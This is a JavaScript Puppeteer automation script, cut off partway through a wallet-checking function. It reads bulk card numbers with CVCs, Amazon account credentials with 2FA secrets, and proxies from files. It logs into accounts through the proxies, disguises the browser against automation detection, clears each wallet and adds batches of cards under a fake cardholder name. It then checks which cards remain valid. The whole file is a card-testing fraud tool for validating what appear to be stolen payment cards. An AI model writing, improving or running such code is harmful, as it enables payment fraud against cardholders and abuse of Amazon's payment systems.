const fs = require('fs');
const path = require('path');
const puppeteer = require('puppeteer');
const axios = require('axios');
const windowManager = require('./windowManager');
const { inflateRaw } = require('zlib');
const https = require('https');

const data = JSON.parse(fs.readFileSync(path.join(__dirname, "..", "data", 'data.json'), 'utf8'));

// ✅ THÊM HÀM KIỂM TRA THẺ HẾT HẠN
function isCardExpired(month, year) {
    const currentDate = new Date();
    const currentMonth = currentDate.getMonth() + 1; // getMonth() returns 0-11
    const currentYear = currentDate.getFullYear();
    
    // Chuyển đổi năm 2 số thành 4 số nếu cần
    const cardYear = year.length === 2 ? parseInt('20' + year) : parseInt(year);
    const cardMonth = parseInt(month);
    
    // So sánh năm trước
    if (cardYear < currentYear) {
        return true;
    }
    
    // Nếu cùng năm, so sánh tháng
    if (cardYear === currentYear && cardMonth < currentMonth) {
        return true;
    }
    
    return false;
}

// ✅ SỬA ĐỔI PHẦN LOAD VÀ LỌC CARDS
let allCards = fs.readFileSync(path.join(__dirname, "..", "data", 'card.txt'), 'utf8')
    .replaceAll("\r", '')
    .split("\n")
    .map(line => line.trim())
    .filter(line => line.length > 0);

// ✅ LỌC BỎ THẺ HẾT HẠN
let listCards = [];
let expiredCount = 0;

allCards.forEach(card => {
    const parts = card.split('|');
    if (parts.length >= 3) {
        const [number, month, year] = parts;
        
        if (isCardExpired(month, year)) {
            expiredCount++;
            console.log(`❌ Expired card filtered: ***${number.slice(-4)} - ${month}/${year}`);
        } else {
            listCards.push(card);
        }
    } else {
        // Nếu format không đúng, vẫn giữ lại
        listCards.push(card);
    }
});

console.log(`📊 Card filtering results:`);
console.log(`   ✅ Valid cards: ${listCards.length}`);
console.log(`   ❌ Expired cards filtered: ${expiredCount}`);
console.app(`📊 Filtered: ${listCards.length} valid, ${expiredCount} expired cards`);

let indexCard = -1;

// Load all accounts and filter only business accounts
const allAccounts = fs.readFileSync(path.join(__dirname, "..", "data", 'acc.txt'), 'utf8').replaceAll("\r", '').split("\n").map(line => line.trim()).filter(line => line.length > 0);
const dataConfig = JSON.parse(fs.readFileSync(path.join(__dirname, "..", "data", 'data.json'), 'utf8'));
const businessEmails = dataConfig.businessAccounts || [];

// Filter accounts to only include business accounts
let listChild = allAccounts.filter(accountLine => {
    const email = accountLine.split('|')[0];
    return businessEmails.includes(email);
});

console.log(`📊 Loaded: ${allAccounts.length} total accounts, ${listChild.length} business accounts`);

let indexChild = -1;
let listProxy = fs.readFileSync(path.join(__dirname, "..", "data", 'proxies.txt'), 'utf8').replaceAll("\r", '').split("\n").map(line => line.trim()).filter(line => line.length > 0);

// Set total card count at startup
const totalCards = listCards.length; // ✅ SỬ DỤNG SỐ LƯỢNG THẺ SAU KHI LỌC


if (!global.data) {
    global.data = {};
}
if (!global.data.settings) {
    global.data.settings = {};
}


global.data.cardTotal = totalCards;

// Update UI counters if console.card is available
if (console.card && typeof console.card.setTotal === 'function') {
    console.card.setTotal(totalCards);
}

// Add a BIN cache to reduce API calls
const binCache = {};
const binCacheFile = path.join(__dirname, "..", "data", 'bin_cache.json');

// Load bin cache if it exists
try {
    if (fs.existsSync(binCacheFile)) {
        const cacheData = fs.readFileSync(binCacheFile, 'utf8');
        Object.assign(binCache, JSON.parse(cacheData));
    }
} catch (error) {
    console.log(`❌ BIN cache load error: ${error.message}`);
}

// Save cache periodically
setInterval(() => {
    try {
        fs.writeFileSync(binCacheFile, JSON.stringify(binCache), 'utf8');
    } catch (error) {
        console.log(`❌ BIN cache save error: ${error.message}`);
    }
}, 30000);

// ✅ ALSO INITIALIZE global.temp HERE
if (!global.temp) {
    global.temp = {};
}

async function checkCard() {
    !data.childCount ? data.childCount = {} : "";
    !global.temp ? global.temp = {} : "";
    !global.temp.checkCard ? global.temp.checkCard = {} : "";
    
    // ✅ RESET WINDOW POSITIONS AT START
    windowManager.reset();
    
    console.app(`🚀 Starting card check with ${totalCards} cards`);
    
    for (let i in listProxy) {
        let [host, port, user, pass] = listProxy[i].split(':');
        let proxy = {
            host: host,
            port: port,
            user: user,
            pass: pass
        };
        initThread(proxy, i);
    }
}

async function initThread(proxy, index) {
    indexChild++;
    if (indexChild >= listChild.length) {
        console.app("✅ All accounts processed");
        console.log("✅ All accounts processed");
        return;
    }
    let [email, pass, secret] = listChild[indexChild].split("|");
    if (data.childCount[email] >= 80) {
        console.app(`⏭️ Max cards reached for ${email}`);
        initThread(proxy, index);
        return;
    }

    console.log(`🔐 Starting thread for: ${email} (${data.childCount[email] || 0}/80)`);
    console.app(`🔐 Thread started: ${email} (${data.childCount[email] || 0}/80)`);

    const windowPosition = windowManager.getNextPosition();

    if (!global.data.settings) {
        global.data.settings = {};
    }
    if (!global.data.parentAcc) {
        global.data.parentAcc = {};
    }

    // ✅ TEST PROXY CONNECTION FIRST
    console.log(`🌐 Testing proxy: ${proxy.user}@${proxy.host}:${proxy.port}`);

    const browser = await puppeteer.launch({
        headless: !global.data.settings.showBrowser && global.data.parentAcc.geminiKey != "",
        timeout: 60000, // ✅ INCREASED TIMEOUT
        args: [
            // ✅ IMPROVED PROXY CONFIGURATION
            `--proxy-server=${proxy.host}:${proxy.port}`,
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-web-security',
            '--ignore-certificate-errors',
            '--disable-infobars',
            `--window-position=${windowPosition.x},${windowPosition.y}`,
            `--window-size=${windowPosition.width},${windowPosition.height}`,
            '--disable-dev-shm-usage',
            '--disable-extensions',
            '--disable-gpu',
            '--disable-save-password-bubble',
            '--disable-autofill-keyboard-accessory-view',
            '--disable-autofill-keyboard-accessory',
            '--disable-translate',
            '--disable-features=VizDisplayCompositor',
            '--disable-password-generation',
            '--disable-password-manager-reauthentication',
            '--password-store=basic',
            '--use-mock-keychain',
            '--disable-component-extensions-with-background-pages',
            '--disable-default-apps',
            '--disable-background-timer-throttling',
            '--disable-backgrounding-occluded-windows',
            '--disable-renderer-backgrounding',
            // ✅ ADDITIONAL PROXY FLAGS
            '--proxy-bypass-list=<-loopback>',
            '--disable-proxy-certificate-handler',
            '--ignore-ssl-errors',
            '--ignore-certificate-errors-spki-list',
            '--ignore-ssl-errors-list',
            '--allow-running-insecure-content'
        ],
        ignoreDefaultArgs: ['--enable-automation']
    });

    const page = await browser.newPage();
    
    await page.setViewport({
        width: windowPosition.width - 20,
        height: windowPosition.height - 100
    });

    // ✅ SET PROXY AUTHENTICATION BEFORE ANY REQUESTS
    await page.authenticate({ 
        username: proxy.user, 
        password: proxy.pass 
    });

    // ✅ SET LONGER TIMEOUTS
    await page.setDefaultNavigationTimeout(90000);
    await page.setDefaultTimeout(90000);

    // ✅ SET USER AGENT TO AVOID DETECTION
    await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');

    // ✅ TEST PROXY FIRST
    try {
        console.log(`🔍 Testing proxy connectivity...`);
        await page.goto('https://httpbin.org/ip', { 
            waitUntil: 'networkidle2',
            timeout: 30000 
        });
        
        const proxyIP = await page.evaluate(() => {
            try {
                return JSON.parse(document.body.innerText).origin;
            } catch {
                return 'Unknown';
            }
        });
        
        console.log(`✅ Proxy working: ${proxyIP}`);
        console.app(`✅ Proxy IP: ${proxyIP}`);
        
    } catch (proxyTestError) {
        console.log(`❌ Proxy test failed: ${proxyTestError.message}`);
        console.app(`❌ Proxy failed: ${email}`);
        await browser.close();
        
        // ✅ TRY NEXT PROXY OR RETRY
        setTimeout(() => initThread(proxy, index), 5000);
        return;
    }

    let form = {
        email,
        pass,
        code: secret,
        proxy: {
            host: proxy.host,
            port: proxy.port,
            username: proxy.user,
            password: proxy.pass
        }
    };

    try {
        await require(path.join(__dirname, "..", "api", "login.js"))(page, form);
    } catch (loginError) {
        console.log(`❌ Login failed: ${email} - ${loginError.message}`);
        console.app(`❌ Login failed: ${email}`);
        await browser.close();
        
        // ✅ RETRY WITH DELAY
        setTimeout(() => initThread(proxy, index), 10000);
        return;
    }

    await new Promise(resolve => setTimeout(resolve, 1500));
    if (page.url().includes('account-status.amazon.com')) {
        console.app(`❌ Account suspended: ${email}`);
        console.log(`❌ Account suspended: ${email}`);
        await browser.close();
        initThread(proxy, index);
        return;
    }
    let linkNow = page.url();

    // Ensure we're on the main Amazon page after login
    if (!linkNow.includes('amazon.com') || linkNow.includes('/ap/') || linkNow.includes('/gp/')) {
        // console.log(`Redirecting to Amazon homepage from: ${linkNow}`); // ✅ REMOVED
        // console.app(`Redirecting to Amazon homepage from: ${linkNow}`); // ✅ REMOVED
        try {
            await page.goto('https://www.amazon.com', { 
                waitUntil: 'domcontentloaded',
                timeout: 30000
            });
        } catch (navError) {
            // console.log(`Navigation timeout, continuing anyway: ${navError.message}`); // ✅ REMOVED
            // console.app(`Navigation timeout, continuing anyway: ${navError.message}`); // ✅ REMOVED
        }
        linkNow = page.url();
    }

    // Check the address book
    try {
        await require(path.join(__dirname, "..", "api", "addAddress.js")).gotoBook(page);
        if (!(await require(path.join(__dirname, "..", "api", "addAddress.js")).checkBook(page))) {
            await require(path.join(__dirname, "..", "api", "addAddress.js")).addAddress(page);
        }
        try {
            await page.goto(linkNow, { 
                waitUntil: 'domcontentloaded',
                timeout: 30000 
            });
        } catch (navError) {
            // console.log(`Navigation back to ${linkNow} timed out, continuing: ${navError.message}`); // ✅ REMOVED
        }
    } catch (addressError) {
        console.log(`⚠️ Address error: ${email}`);
        console.app(`⚠️ Address error: ${email}`);
    }

    let res = await require(path.join(__dirname, "..", "api", "goPayment.js"))(page);

    if (res.error) {
        console.log(`❌ Payment page error: ${email}`);
        console.app(`❌ Payment page error: ${email}`);
        browser.close();
        initThread(proxy, index);
        return;
    }

    await clearExistingCards(page, email);
    thread(page, browser, email, index, proxy);
}

/**
 * Enhanced function to clear all existing cards before adding new ones
 */
async function clearExistingCards(page, email) {
    try {
        console.log(`🗑️ Starting to clear existing cards for ${email}...`);
        console.app(`🗑️ Clearing existing cards: ${email}`);
        
        // Navigate to payment wallet page
        const currentUrl = page.url();
        if (!currentUrl.includes('yourpayments') || !currentUrl.includes('wallet')) {
            await page.goto('https://www.amazon.com/cpe/yourpayments/wallet', { 
                waitUntil: 'domcontentloaded',
                timeout: 30000 
            });
            await new Promise(resolve => setTimeout(resolve, 5000));
        }

        // Wait for page to fully load
        await new Promise(resolve => setTimeout(resolve, 3000));
        
        let totalRemovalAttempts = 0;
        const maxTotalAttempts = 15; // Prevent infinite loop
        let consecutiveFailures = 0;
        const maxConsecutiveFailures = 3;

        while (totalRemovalAttempts < maxTotalAttempts && consecutiveFailures < maxConsecutiveFailures) {
            totalRemovalAttempts++;
            
            // Check for existing payment methods
            const existingCardCount = await page.evaluate(() => {
                const walletContainer = document.querySelector('.a-scroller.apx-wallet-desktop-payment-method-selectable-tab-css.a-scroller-vertical');
                
                if (!walletContainer || !walletContainer.childNodes[0]) {
                    return 0;
                }
                
                const paymentMethods = walletContainer.childNodes[0].childNodes;
                let realCardCount = 0;
                
                for (let i = 0; i < paymentMethods.length; i++) {
                    const method = paymentMethods[i];
                    
                    if (method.nodeName && method.nodeName.toLowerCase() === 'div') {
                        // Check if it's not the "Add payment method" box
                        const isAddBox = method.querySelector('.apx-add-payment-method-box, .pmts-add-pm-tile, [data-testid="pmts-add-payment-method-tile"]');
                        
                        if (!isAddBox) {
                            realCardCount++;
                        }
                    }
                }
                
                return realCardCount;
            });

            console.log(`🔍 Found ${existingCardCount} existing cards (attempt ${totalRemovalAttempts})`);

            if (existingCardCount === 0) {
                console.log(`✅ No more cards to remove for ${email}`);
                console.app(`✅ All cards cleared: ${email}`);
                consecutiveFailures = 0;
                break;
            }

            // Try to click on the first available card
            const cardClicked = await page.evaluate(() => {
                const walletContainer = document.querySelector('.a-scroller.apx-wallet-desktop-payment-method-selectable-tab-css.a-scroller-vertical');
                
                if (!walletContainer || !walletContainer.childNodes[0]) {
                    return false;
                }
                
                const paymentMethods = walletContainer.childNodes[0].childNodes;
                
                for (let i = 0; i < paymentMethods.length; i++) {
                    const method = paymentMethods[i];
                    
                    if (method.nodeName && method.nodeName.toLowerCase() === 'div') {
                        // Skip "Add payment method" box
                        const isAddBox = method.querySelector('.apx-add-payment-method-box, .pmts-add-pm-tile, [data-testid="pmts-add-payment-method-tile"]');
                        
                        if (!isAddBox) {
                            try {
                                method.click();
                                return true;
                            } catch (clickError) {
                                continue;
                            }
                        }
                    }
                }
                
                return false;
            });

            if (!cardClicked) {
                console.log(`❌ Could not click on any card (attempt ${totalRemovalAttempts})`);
                consecutiveFailures++;
                
                // Try page refresh
                if (consecutiveFailures < maxConsecutiveFailures) {
                    console.log(`🔄 Refreshing page and retrying...`);
                    await page.reload({ waitUntil: 'domcontentloaded', timeout: 30000 });
                    await new Promise(resolve => setTimeout(resolve, 5000));
                }
                continue;
            }

            // Wait for card details to load
            await new Promise(resolve => setTimeout(resolve, 3000));

            // Get card info before removing
            const cardInfo = await page.evaluate(() => {
                const cardSelectors = [
                    '.a-size-base-plus.pmts-instrument-number-tail span',
                    '.pmts-instrument-number span',
                    '[class*="instrument-number"] span'
                ];
                
                let cardNumber = 'Unknown';
                for (const selector of cardSelectors) {
                    const element = document.querySelector(selector);
                    if (element && element.innerText) {
                        cardNumber = element.innerText;
                        break;
                    }
                }
                
                return { number: cardNumber };
            });

            // Attempt to remove the card with enhanced retry logic
            let cardRemoved = { success: false };
            let removalAttempts = 0;
            const maxRemovalAttempts = 5;
            
            while (removalAttempts < maxRemovalAttempts && !cardRemoved.success) {
                removalAttempts++;
                console.log(`   🗑️ Removing card ${cardInfo.number} (attempt ${removalAttempts}/${maxRemovalAttempts})`);
                
                cardRemoved = await removeCardEnhanced(page);
                
                if (cardRemoved.success) {
                    console.log(`   ✅ Successfully removed card: ${cardInfo.number}`);
                    consecutiveFailures = 0;
                    break;
                } else if (cardRemoved.reload) {
                    console.log(`   🔄 Need to reload page for card removal`);
                    await page.reload({ waitUntil: 'domcontentloaded', timeout: 30000 });
                    await new Promise(resolve => setTimeout(resolve, 5000));
                } else {
                    console.log(`   ❌ Failed to remove card: ${cardInfo.number} (attempt ${removalAttempts})`);
                    await new Promise(resolve => setTimeout(resolve, 2000));
                }
            }
            
            if (!cardRemoved.success) {
                console.log(`❌ Failed to remove card after ${maxRemovalAttempts} attempts: ${cardInfo.number}`);
                consecutiveFailures++;
                
                // If we can't remove this card, try to continue with others
                if (consecutiveFailures < maxConsecutiveFailures) {
                    continue;
                } else {
                    console.log(`❌ Too many consecutive failures, stopping card removal`);
                    break;
                }
            }

            // Wait before processing next card
            await new Promise(resolve => setTimeout(resolve, randomInt(2000, 4000)));
        }

        // Final verification
        const finalCardCount = await page.evaluate(() => {
            const walletContainer = document.querySelector('.a-scroller.apx-wallet-desktop-payment-method-selectable-tab-css.a-scroller-vertical');
            
            if (!walletContainer || !walletContainer.childNodes[0]) {
                return 0;
            }
            
            const paymentMethods = walletContainer.childNodes[0].childNodes;
            let realCardCount = 0;
            
            for (let i = 0; i < paymentMethods.length; i++) {
                const method = paymentMethods[i];
                
                if (method.nodeName && method.nodeName.toLowerCase() === 'div') {
                    const isAddBox = method.querySelector('.apx-add-payment-method-box, .pmts-add-pm-tile, [data-testid="pmts-add-payment-method-tile"]');
                    
                    if (!isAddBox) {
                        realCardCount++;
                    }
                }
            }
            
            return realCardCount;
        });

        if (finalCardCount === 0) {
            console.log(`✅ All cards successfully cleared for ${email}`);
            console.app(`✅ Wallet cleared: ${email}`);
        } else {
            console.log(`⚠️ ${finalCardCount} cards remaining for ${email} after cleanup attempts`);
            console.app(`⚠️ ${finalCardCount} cards remaining: ${email}`);
        }

        // Wait a bit before proceeding to add new cards
        await new Promise(resolve => setTimeout(resolve, 3000));
        
        return { success: finalCardCount === 0, remainingCards: finalCardCount };

    } catch (error) {
        console.log(`❌ Clear cards error for ${email}: ${error.message}`);
        console.app(`❌ Clear cards error: ${email}`);
        return { success: false, error: error.message };
    }
}

/**
 * Enhanced card removal function with better error handling
 */
async function removeCardEnhanced(page) {
    try {
        if (!page || page.isClosed()) {
            return { success: false, error: 'Page closed' };
        }

        // Wait a moment before starting removal process
        await new Promise(resolve => setTimeout(resolve, randomInt(1000, 2000)));
        
        // Step 1: Look for and click the remove/delete link
        const removeLinkSelectors = [
            '.a-row.apx-wallet-payment-method-details-section.pmts-portal-component .a-link-normal',
            '.pmts-portal-component .a-link-normal',
            'a[href*="remove"]',
            'a[href*="delete"]',
            '.apx-remove-link'
        ];

        let removeLinkFound = false;
        for (const selector of removeLinkSelectors) {
            try {
                await page.waitForSelector(selector, { timeout: 5000 });
                await page.click(selector);
                removeLinkFound = true;
                console.log(`   ✅ Clicked remove link with selector: ${selector}`);
                break;
            } catch (selectorError) {
                continue;
            }
        }

        // Try JavaScript click if normal selectors fail
        if (!removeLinkFound) {
            removeLinkFound = await page.evaluate(() => {
                // Look for any link that might be a remove/delete link
                const links = document.querySelectorAll('a');
                for (const link of links) {
                    const href = link.getAttribute('href') || '';
                    const text = link.textContent.toLowerCase();
                    
                    if (href.includes('remove') || href.includes('delete') || 
                        text.includes('remove') || text.includes('delete')) {
                        link.click();
                        return true;
                    }
                }
                return false;
            });
        }

        if (!removeLinkFound) {
            console.log(`   ❌ Could not find remove link`);
            return { success: false, reload: true };
        }

        // Wait for removal dialog to appear
        await new Promise(resolve => setTimeout(resolve, randomInt(2000, 3000)));

        // Step 2: Look for and click the confirmation button
        const confirmButtonSelectors = [
            '.a-popover.a-popover-modal.a-declarative[aria-hidden="false"] .a-popover-wrapper .apx-remove-link-button',
            '.apx-remove-link-button',
            'input[value*="Remove"]',
            'button[value*="Remove"]'
        ];

        let confirmButtonFound = false;
        for (const selector of confirmButtonSelectors) {
            try {
                await page.waitForSelector(selector, { timeout: 8000 });
                await page.click(selector);
                confirmButtonFound = true;
                console.log(`   ✅ Clicked confirm button with selector: ${selector}`);
                break;
            } catch (selectorError) {
                continue;
            }
        }

        if (!confirmButtonFound) {
            console.log(`   ❌ Could not find confirmation button`);
            return { success: false };
        }

        // Wait for potential second confirmation
        await new Promise(resolve => setTimeout(resolve, randomInt(1500, 2500)));

        // Step 3: Handle "Remove without selecting" option if present
        try {
            const removeWithoutSelectingExists = await page.waitForSelector(
                '.a-popover.a-popover-modal.a-declarative[aria-hidden="false"] .apx-remove-link-button[value="Remove without selecting"]', 
                { timeout: 5000 }
            ).then(() => true).catch(() => false);

            if (removeWithoutSelectingExists) {
                await page.click('.a-popover.a-popover-modal.a-declarative[aria-hidden="false"] .apx-remove-link-button[value="Remove without selecting"]');
                console.log(`   ✅ Clicked "Remove without selecting"`);
                await new Promise(resolve => setTimeout(resolve, randomInt(2000, 3000)));
                return { success: true };
            }
        } catch (removeWithoutError) {
            // Continue to next step
        }

        // Step 4: Handle final confirmation button
        const finalConfirmSelectors = [
            '.a-popover.a-popover-modal.a-declarative[aria-hidden="false"] .a-popover-wrapper span.a-button.a-button-primary.pmts-delete-instrument.apx-remove-button-desktop.pmts-button-input input.a-button-input',
            '.pmts-delete-instrument input.a-button-input',
            '.apx-remove-button-desktop input',
            'input[type="submit"][value*="Remove"]'
        ];

        let finalConfirmFound = false;
        for (const selector of finalConfirmSelectors) {
            try {
                await page.waitForSelector(selector, { timeout: 8000 });
                await page.click(selector);
                finalConfirmFound = true;
                console.log(`   ✅ Clicked final confirm button with selector: ${selector}`);
                break;
            } catch (selectorError) {
                continue;
            }
        }

        // Try JavaScript approach for final confirmation
        if (!finalConfirmFound) {
            finalConfirmFound = await page.evaluate(() => {
                const buttons = document.querySelectorAll('input[type="submit"], button');
                for (const button of buttons) {
                    const value = button.getAttribute('value') || '';
                    const text = button.textContent.toLowerCase();
                    
                    if (value.includes('Remove') || text.includes('remove') || 
                        value.includes('Delete') || text.includes('delete')) {
                        button.click();
                        return true;
                    }
                }
                return false;
            });
        }

        if (!finalConfirmFound) {
            console.log(`   ❌ Could not find final confirmation button`);
            return { success: false };
        }

        // Wait for removal to complete
        await new Promise(resolve => setTimeout(resolve, randomInt(3000, 5000)));
        
        console.log(`   ✅ Card removal process completed`);
        return { success: true };

    } catch (error) {
        console.log(`   ❌ Remove card error: ${error.message}`);
        return { success: false, error: error.message };
    }
}

// Update the thread function to ensure cards are cleared before adding new ones
async function thread(page, browser, email, index, proxy) {
    global.temp.checkCard[index] = {};
    
    if (indexCard >= listCards.length) {
        const hasCardsToVerify = Object.keys(global.temp.checkCard[index]).length > 0;
        
        if (!hasCardsToVerify) {
            console.app("🏁 All cards processed");
            console.log("🏁 All cards processed");
            await browser.close();
            clearInterval(saveData);
            return;
        }
        
        console.log(`🔄 Checking wallet: ${email}`);
        console.app(`🔄 Checking wallet: ${email}`);
        
        updateRemainingCardCount();
        
        await new Promise(resolve => setTimeout(resolve, global.data.settings.checkAfter));
        
        await checkWallet(page, browser, email, index, proxy);
        
        console.app("🚪 Browser closed");
        console.log("🚪 Browser closed");
        try {
            await browser.close();
        } catch (closeError) {
            // Silent
        }
        return;
    }
    
    const currentCount = data.childCount[email] || 0;
    if (currentCount >= 80) {
        console.app(`⏭️ Max cards reached: ${email} (${currentCount}/80)`);
        console.log(`⏭️ Max cards reached: ${email} (${currentCount}/80)`);
        initThread(proxy, index);
        return;
    }
    
    console.log(`➕ Adding cards: ${email} (${currentCount}/80)`);
    console.app(`➕ Adding cards: ${email} (${currentCount}/80)`);
    
    // ✅ ENSURE WALLET IS COMPLETELY CLEAR BEFORE ADDING CARDS
    const clearResult = await clearExistingCards(page, email);
    if (!clearResult.success) {
        console.log(`⚠️ Could not fully clear wallet for ${email}, continuing anyway...`);
    }
    
    for (let i = 0; i < 5; i++) {
        indexCard++;
        let card = listCards[indexCard];
        if (indexCard >= listCards.length) {
            console.app("📋 All cards from list added");
            break;
        }
        
        // ✅ LƯU TOÀN BỘ DỮ LIỆU GỐC
        let originalCardData = card;
        
        let [number, month, year, cvc] = card.split('|');
        year = year.length == 2 ? '20' + year : year;
        month = month.length == 1 ? '0' + month : month;
        let form = {
            number,
            month,
            year,
            name: 'Saint David',
            cvc
        };
        
        let res = await require(path.join(__dirname, "..", "api", "addCard.js"))(page, form);
        let attempts = 1;
        const maxAttempts = 5;
        while (!res.success && attempts < maxAttempts) {
            attempts++;
            
            await new Promise(resolve => setTimeout(resolve, 5000));
            
            try {
                await page.reload({ 
                    waitUntil: ['domcontentloaded'],
                    timeout: 30000
                });
                
                await new Promise(resolve => setTimeout(resolve, 8000));
                
                const currentUrl = page.url();
                if (!currentUrl.includes('yourpayments') || !currentUrl.includes('wallet')) {
                    let navRes = await require(path.join(__dirname, "..", "api", "goPayment.js"))(page);
                    if (navRes.error) {
                        break;
                    }
                    await new Promise(resolve => setTimeout(resolve, 5000));
                }
                
            } catch (error) {
                if (error.name === 'TimeoutError') {
                    // Continue anyway
                } else {
                    throw error;
                }
            }
            
            res = await require(path.join(__dirname, "..", "api", "addCard.js"))(page, form);
        }
        
        if (!res.success) {
            console.log(`❌ Card add failed: ***${card.slice(-4)} after ${maxAttempts} attempts`);
            console.app(`❌ Card add failed: ***${card.slice(-4)}`);
            continue;
        }

        // Card info extraction with better error handling
        let cardInfo = null;
        let extractionAttempts = 0;
        const maxExtractionAttempts = 3;
        
        while (!cardInfo && extractionAttempts < maxExtractionAttempts) {
            extractionAttempts++;
            // console.log(`Attempting to extract card info, attempt ${extractionAttempts}/${maxExtractionAttempts}`); // ✅ REMOVED
            
            try {
                const selectorResults = await Promise.allSettled([
                    page.waitForSelector('.a-size-base-plus.pmts-instrument-number-tail span', { timeout: 8000 }),
                    page.waitForSelector('.pmts-instrument-number span', { timeout: 6000 }),
                    page.waitForSelector('[class*="instrument-number"] span', { timeout: 6000 }),
                    page.waitForSelector('[data-testid="pmts-credit-card-instrument"]', { timeout: 8000 })
                ]);
                
                let workingSelector = null;
                const selectors = [
                    '.a-size-base-plus.pmts-instrument-number-tail span',
                    '.pmts-instrument-number span',
                    '[class*="instrument-number"] span',
                    '[data-testid="pmts-credit-card-instrument"]'
                ];
                
                for (let i = 0; i < selectorResults.length; i++) {
                    if (selectorResults[i].status === 'fulfilled') {
                        workingSelector = selectors[i];
                        // console.log(`✅ Found working selector: ${workingSelector}`); // ✅ REMOVED
                        break;
                    }
                }
                
                if (!workingSelector) {
                    // console.log(`❌ No working selector found on attempt ${extractionAttempts}, trying page navigation...`); // ✅ REMOVED
                    
                    await page.goto('https://www.amazon.com/cpe/yourpayments/wallet', { 
                        waitUntil: 'domcontentloaded',
                        timeout: 15000
                    });
                    await new Promise(resolve => setTimeout(resolve, 5000));
                    
                    try {
                        await page.waitForSelector('.a-size-base-plus.pmts-instrument-number-tail span', { timeout: 8000 });
                        workingSelector = '.a-size-base-plus.pmts-instrument-number-tail span';
                        // console.log('✅ Card info found after wallet navigation'); // ✅ REMOVED
                    } catch (navError) {
                        // console.log(`Still no card info after navigation: ${navError.message}`); // ✅ REMOVED
                        if (extractionAttempts < maxExtractionAttempts) {
                            await new Promise(resolve => setTimeout(resolve, 3000));
                            continue;
                        } else {
                            throw new Error('Card extraction failed after all attempts');
                        }
                    }
                }
                
                cardInfo = await page.evaluate((selector) => {
                    let card = document.querySelector(selector);
                    
                    if (!card) {
                        const cardSelectors = [
                            '.a-size-base-plus.pmts-instrument-number-tail span',
                            '.pmts-instrument-number span',
                            '[class*="instrument-number"] span',
                            '.pmts-instrument-display-number',
                            '[data-testid="pmts-credit-card-instrument"] span'
                        ];
                        
                        for (const sel of cardSelectors) {
                            card = document.querySelector(sel);
                            if (card && card.innerText) break;
                        }
                    }

                    let link = null;
                    const imgSelectors = [
                        '.a-row.apx-wallet-payment-method-details-section.pmts-portal-component .a-fixed-left-grid-col.a-col-left img',
                        '.pmts-portal-component img',
                        '.apx-wallet-payment-method-details-section img',
                        '[data-testid="pmts-credit-card-instrument"] img',
                        '.pmts-instrument-brand img'
                    ];
                    
                    for (const sel of imgSelectors) {
                        link = document.querySelector(sel);
                        if (link && link.src) break;
                    }

                    let name = null;
                    const nameSelector = '.apx-wallet-details-header.a-text-bold';
                    name = document.querySelector(nameSelector) ? document.querySelector(nameSelector).innerText : '';

                    return {
                        name,
                        number: card ? card.innerText : '',
                        link: link ? link.src : ''
                    };
                }, workingSelector);
                
                if (cardInfo && cardInfo.number) {
                    // console.log(`✅ Successfully extracted card info: ${cardInfo.number}`); // ✅ REMOVED
                    break;
                } else {
                    // console.log(`❌ Card info extraction returned empty data`); // ✅ REMOVED
                    cardInfo = null;
                }
                
            } catch (error) {
                // console.log(`Card info extraction attempt ${extractionAttempts} failed: ${error.message}`); // ✅ REMOVED
                if (extractionAttempts < maxExtractionAttempts) {
                    await new Promise(resolve => setTimeout(resolve, 3000));
                } else {
                    // console.log(`❌ Failed to extract card info after ${maxExtractionAttempts} attempts, skipping card ${card}`); // ✅ REMOVED
                    break;
                }
            }
        }

        if (!cardInfo || !cardInfo.number) {
            console.log(`⚠️ No card info found: ***${card.slice(-4)}`);
            console.app(`⚠️ No card info found: ***${card.slice(-4)}`);
            continue;
        }

        let fourNum = cardInfo.number.split('•••• ')[1];
        if (!fourNum) {
            // console.log(`Could not extract last 4 digits from ${cardInfo.number}, using full number`); // ✅ REMOVED
            fourNum = cardInfo.number.replace(/\D/g, '').slice(-4);
        }
        
        global.temp.checkCard[index][fourNum] = {
            name: cardInfo.name,
            img: cardInfo.link,
            card: form,
            originalData: originalCardData // ✅ LƯU DỮ LIỆU GỐC
        }

        data.childCount[email] = (data.childCount[email] || 0) + 1;
        console.log(`✅ Card added: ${email} (${data.childCount[email]}/80)`);
        console.app(`✅ Card added: ${email} (${data.childCount[email]}/80)`);
        
        fs.writeFileSync(path.join(__dirname, "..", "data", 'data.json'), JSON.stringify(data, null, 2), 'utf8');
        
        await new Promise(resolve => setTimeout(resolve, randomInt(1000, 2000)));
    }

    updateRemainingCardCount();

    console.log(`⏳ Waiting ${global.data.settings.checkAfter / 1000}s before wallet check: ${email}`);
    console.app(`⏳ Waiting ${global.data.settings.checkAfter / 1000}s: ${email}`);

    await new Promise(resolve => setTimeout(resolve, global.data.settings.checkAfter));

    console.log(`🔍 Checking wallet: ${email}`);
    console.app(`🔍 Checking wallet: ${email}`);

    checkWallet(page, browser, email, index, proxy);
}

/**
 * Check wallet and verify card status
 */
async function checkWallet(page, browser, email, index, proxy) {
    try {
        await page.reload({ 
            waitUntil: ["networkidle0", "domcontentloaded"],
            timeout: data.settings.navigationTimeout || 30000
        });

        await page.waitForSelector('.a-scroller.apx-wallet-desktop-payment-method-selectable-tab-css.a-scroller-vertical', { timeout: 15000 });

        let length = await page.evaluate(async () => {
            let wallet = document.querySelector('.a-scroller.apx-wallet-desktop-payment-method-selectable-tab-css.a-scroller-vertical');
            return wallet && wallet.childNodes[0] ? wallet.childNodes[0].childNodes.length : 0;
        });

        let indexCard = 0;
        while (indexCard < length) {
            let wallet = await page.evaluate((i) => {
                let container = document.querySelector('.a-scroller.apx-wallet-desktop-payment-method-selectable-tab-css.a-scroller-vertical');
                if (!container || !container.childNodes[0] || !container.childNodes[0].childNodes[i]) return false;
                
                let wallet = container.childNodes[0].childNodes[i];
                if (wallet && wallet.nodeName && wallet.nodeName.toLowerCase() == 'div') {
                    wallet.click();
                    return true;
                }
                return false;
            }, indexCard);

            if (!wallet) {
                indexCard++;
                continue;
            }
            await new Promise(resolve => setTimeout(resolve, 3000));
            
            let cardInfo = await page.evaluate(() => {
                let card = document.querySelector('.a-size-base-plus.pmts-instrument-number-tail span');
                let link = document.querySelector('.a-row.apx-wallet-payment-method-details-section.pmts-portal-component .a-fixed-left-grid-col.a-col-left img');
                let name = document.querySelector('.apx-wallet-details-header.a-text-bold');

                return {
                    number: card ? card.innerText : '',
                    link: link ? link.src : '',
                    name: name ? name.innerText : '',
